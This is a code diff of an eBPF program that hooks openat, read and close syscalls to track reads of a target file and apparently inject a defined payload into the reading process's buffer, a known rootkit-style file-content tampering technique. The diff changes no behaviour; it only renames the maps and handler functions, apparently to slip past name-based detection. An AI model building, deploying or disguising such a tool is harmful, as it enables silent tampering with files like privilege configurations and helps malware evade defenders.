@@ -12,7 +12,7 @@ struct {
     __uint(max_entries, 8192);
     __type(key, size_t);
     __type(value, unsigned int);
-} map_fds SEC(".maps");
+} fd_tracker SEC(".maps");
 
 // Map to hold the buffer sizes from 'read' calls
 struct {
@@ -20,7 +20,7 @@ struct {
     __uint(max_entries, 8192);
     __type(key, size_t);
     __type(value, long unsigned int);
-} map_buff_addrs SEC(".maps");
+} buf_tracker SEC(".maps");
 
 // Optional Target Parent PID
 const volatile int target_ppid = 0;
@@ -51,7 +51,7 @@ const int payload_len = sizeof(PAYLOAD_STR) - 1;
 const char payload[MAX_PAYLOAD_LEN] = PAYLOAD_STR;
 
 SEC("tp/syscalls/sys_enter_openat")
-int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
+int ev_openat_enter(struct trace_event_raw_sys_enter *ctx)
 {
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int pid = pid_tgid >> 32;
@@ -95,17 +95,17 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx)
 
     // Add pid_tgid to map for our sys_exit call
     unsigned int zero = 0;
-    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);
+    bpf_map_update_elem(&fd_tracker, &pid_tgid, &zero, BPF_ANY);
 
     return 0;
 }
 
 SEC("tp/syscalls/sys_exit_openat")
-int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
+int ev_openat_exit(struct trace_event_raw_sys_exit *ctx)
 {
     // Check this open call is opening our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
-    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    unsigned int* check = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
     if (check == 0) {
         return 0;
     }
@@ -113,18 +113,18 @@ int handle_openat_exit(struct trace_event_raw_sys_exit *ctx)
 
     // Set the map value to be the returned file descriptor
     unsigned int fd = (unsigned int)ctx->ret;
-    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);
+    bpf_map_update_elem(&fd_tracker, &pid_tgid, &fd, BPF_ANY);
 
     return 0;
 }
 
 SEC("tp/syscalls/sys_enter_read")
-int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
+int ev_read_enter(struct trace_event_raw_sys_enter *ctx)
 {
     // Check this open call is opening our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int pid = pid_tgid >> 32;
-    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    unsigned int* pfd = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
     if (pfd == 0) {
         return 0;
     }
@@ -138,7 +138,7 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
 
     // Store buffer address from arguments in map
     long unsigned int buff_addr = ctx->args[1];
-    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);
+    bpf_map_update_elem(&buf_tracker, &pid_tgid, &buff_addr, BPF_ANY);
 
     // log and exit
     size_t buff_size = (size_t)ctx->args[2];
@@ -146,12 +146,12 @@ int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
 }
 
 SEC("tp/syscalls/sys_exit_read")
-int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
+int ev_read_exit(struct trace_event_raw_sys_exit *ctx)
 {
     // Check this open call is reading our target file
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int pid = pid_tgid >> 32;
-    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
+    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&buf_tracker, &pid_tgid);
     if (pbuff_addr == 0) {
         return 0;
     }
@@ -192,19 +192,19 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
 }
 
 SEC("tp/syscalls/sys_exit_close")
-int handle_close_exit(struct trace_event_raw_sys_exit *ctx)
+int ev_close_exit(struct trace_event_raw_sys_exit *ctx)
 {
     // Check if we're a process thread of interest
     size_t pid_tgid = bpf_get_current_pid_tgid();
     int pid = pid_tgid >> 32;
-    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
+    unsigned int* check = bpf_map_lookup_elem(&fd_tracker, &pid_tgid);
     if (check == 0) {
         return 0;
     }
 
     // Closing file, delete fd from all maps to clean up
-    bpf_map_delete_elem(&map_fds, &pid_tgid);
-    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);
+    bpf_map_delete_elem(&fd_tracker, &pid_tgid);
+    bpf_map_delete_elem(&buf_tracker, &pid_tgid);
 
     return 0;
 }
